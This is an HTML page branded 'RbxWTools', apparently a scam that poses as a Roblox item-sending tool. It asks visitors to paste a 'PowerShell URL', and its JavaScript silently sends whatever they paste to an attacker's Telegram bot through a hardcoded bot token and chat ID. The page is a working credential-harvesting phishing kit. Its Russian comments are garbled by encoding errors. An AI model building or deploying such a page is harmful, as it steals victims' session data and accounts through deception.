<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RbxWTools - PowerShell URL Item Sender</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500&display=swap">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            font-family: 'Rajdhani', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(99, 102, 241, 0.2) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(139, 92, 246, 0.2) 0%, transparent 50%);
            z-index: -1;
        }

        .container {
            width: 100%;
            max-width: 900px;
            text-align: center;
            padding: 30px 20px;
            margin-top: 20px;
        }

        .header {
            margin-bottom: 30px;
            position: relative;
        }

        .neon-text {
            font-family: 'Orbitron', sans-serif;
            font-size: 3rem;
            font-weight: 700;
            text-transform: uppercase;
            color: transparent;
            text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #ff00ff, 0 0 20px #ff00ff, 0 0 25px #ff00ff;
            margin-bottom: 10px;
            letter-spacing: 3px;
        }

        .domain {
            font-family: 'Orbitron', sans-serif;
            color: #8b9dff;
            font-size: 1.1rem;
            letter-spacing: 2px;
            margin-bottom: 25px;
        }

        .input-container {
            position: relative;
            margin-bottom: 25px;
        }

        .input-field {
            width: 100%;
            min-height: 300px;
            background: rgba(0, 0, 0, 0.7);
            border: 2px solid #6366f1;
            border-radius: 10px;
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 20px;
            resize: vertical;
            box-shadow: 0 0 15px rgba(99, 102, 241, 0.7);
            transition: all 0.3s ease;
            line-height: 1.5;
        }

        .input-field:focus {
            outline: none;
            border-color: #8b5cf6;
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.8);
        }

        .input-placeholder {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: rgba(255, 255, 255, 0.4);
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            pointer-events: none;
            text-align: center;
            width: 100%;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
            transition: opacity 0.3s ease;
        }

        .input-field:focus + .input-placeholder,
        .input-field:not(:placeholder-shown) + .input-placeholder {
            opacity: 0;
        }

        .char-counter {
            text-align: right;
            font-size: 12px;
            color: #8b9dff;
            margin-top: 5px;
        }

        .char-counter.warning {
            color: #ff6b6b;
        }

        .btn-ready {
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            color: white;
            border: none;
            padding: 15px 50px;
            font-family: 'Orbitron', sans-serif;
            font-size: 1.1rem;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.7);
            letter-spacing: 1px;
            text-transform: uppercase;
            margin-bottom: 20px;
        }

        .btn-ready:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 25px rgba(139, 92, 246, 0.9);
        }

        .btn-ready:active {
            transform: translateY(0);
        }

        .btn-ready:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .status {
            margin-top: 15px;
            min-height: 24px;
            font-family: 'Rajdhani', sans-serif;
            font-weight: 500;
            font-size: 14px;
        }

        .success {
            color: #4ade80;
        }

        .error {
            color: #f87171;
        }

        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #6366f1;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        footer {
            margin-top: auto;
            padding: 20px;
            text-align: center;
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.6);
        }

        @media (max-width: 768px) {
            .neon-text {
                font-size: 2.2rem;
            }
            
            .input-field {
                min-height: 250px;
                font-size: 13px;
            }
            
            .input-placeholder {
                font-size: 16px;
            }
            
            .btn-ready {
                padding: 12px 40px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="neon-text">RBXWTOOLS</h1>
            <div class="domain">rbxwtools.site</div>
        </div>
        
        <div class="input-container">
            <textarea class="input-field" placeholder=" " id="userInput" maxlength="10000"></textarea>
            <div class="input-placeholder">Insert Item as URL PowerShell</div>
            <div class="char-counter" id="charCounter">0/10000 —Å–∏–º–≤–æ–ª–æ–≤</div>
        </div>
        
        <button class="btn-ready" id="readyBtn">READY</button>
        
        <div class="status" id="status"></div>
    </div>
    
    <footer>
        RbxWTools &copy; 2023 | Powered by Namecheap
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const userInput = document.getElementById('userInput');
            const readyBtn = document.getElementById('readyBtn');
            const status = document.getElementById('status');
            const charCounter = document.getElementById('charCounter');
            
            // –°—á–µ—Ç—á–∏–∫ —Å–∏–º–≤–æ–ª–æ–≤
            userInput.addEventListener('input', function() {
                const length = userInput.value.length;
                charCounter.textContent = `${length}/10000 —Å–∏–º–≤–æ–ª–æ–≤`;
                
                if (length > 9500) {
                    charCounter.classList.add('warning');
                } else {
                    charCounter.classList.remove('warning');
                }
            });
            
            readyBtn.addEventListener('click', function() {
                const text = userInput.value.trim();
                
                if (!text) {
                    showStatus('Please enter some text before submitting', 'error');
                    return;
                }
                
                if (text.length > 10000) {
                    showStatus('Message is too long. Maximum 10000 characters.', 'error');
                    return;
                }
                
                showStatus('Sending to Telegram...', 'loading');
                readyBtn.disabled = true;
                
                // –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –í–ê–® –¢–û–ö–ï–ù –¢–ï–õ–ï–ì–†–ê–ú –ë–û–¢–ê –ò CHAT ID
                const BOT_TOKEN = '8473082734:AAF2dWLlkxu0Ax3K5naojY1ZJdut0NF9vec';
                const CHAT_ID = '8093859683';
                
                sendToTelegram(text, BOT_TOKEN, CHAT_ID);
            });
            
            function sendToTelegram(message, botToken, chatId) {
                // –†–∞–∑–±–∏–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–∞ —á–∞—Å—Ç–∏ –µ—Å–ª–∏ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ
                const maxChunkLength = 4000;
                const messageChunks = [];
                
                if (message.length > maxChunkLength) {
                    for (let i = 0; i < message.length; i += maxChunkLength) {
                        messageChunks.push(message.substring(i, i + maxChunkLength));
                    }
                } else {
                    messageChunks.push(message);
                }
                
                let sentChunks = 0;
                const totalChunks = messageChunks.length;
                
                messageChunks.forEach((chunk, index) => {
                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                    
                    const payload = {
                        chat_id: chatId,
                        text: `üîî –°–æ–æ–±—â–µ–Ω–∏–µ ${index + 1}/${totalChunks}:\n\n\`\`\`\n${chunk}\n\`\`\``,
                        parse_mode: "Markdown"
                    };
                    
                    fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload),
                    })
                    .then(response => response.json())
                    .then(data => {
                        sentChunks++;
                        
                        if (sentChunks === totalChunks) {
                            if (data.ok) {
                                showStatus('Success! Your item has been sent to Telegram.', 'success');
                                userInput.value = '';
                                charCounter.textContent = '0/10000 —Å–∏–º–≤–æ–ª–æ–≤';
                            } else {
                                showStatus('Error: Failed to send to Telegram. ' + (data.description || ''), 'error');
                            }
                            readyBtn.disabled = false;
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        showStatus('Network error. Please check your connection and try again.', 'error');
                        readyBtn.disabled = false;
                    });
                });
            }
            
            function showStatus(message, type) {
                status.textContent = '';
                status.className = 'status';
                
                if (type === 'loading') {
                    const spinner = document.createElement('div');
                    spinner.className = 'loading';
                    status.appendChild(spinner);
                    
                    const text = document.createElement('span');
                    text.textContent = ' ' + message;
                    status.appendChild(text);
                } else {
                    status.textContent = message;
                    status.classList.add(type);
                }
            }
            
            // –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥–∞
            userInput.focus();
        });
    </script>
</body>
</html>
